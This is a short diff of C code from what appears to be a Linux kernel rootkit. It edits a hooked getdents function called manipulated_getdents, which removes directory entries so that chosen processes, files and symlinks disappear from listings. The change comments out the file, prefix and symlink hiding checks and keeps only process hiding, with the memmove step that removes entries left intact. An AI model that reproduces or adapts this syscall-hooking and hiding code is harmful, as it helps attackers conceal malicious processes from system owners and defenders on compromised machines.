@@ -173,10 +173,11 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
 		
-		if(check_hide_fpath(dirp->d_name)
+		/*if(check_hide_fpath(dirp->d_name)
 				|| check_hide_fprefix(dirp->d_name)
 				|| check_hide_process(fd, dirp->d_name)
-				|| check_hide_symlink(dirp->d_name))
+				|| check_hide_symlink(dirp->d_name))*/
+		if(check_hide_process(fd, dirp->d_name))
 		{	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
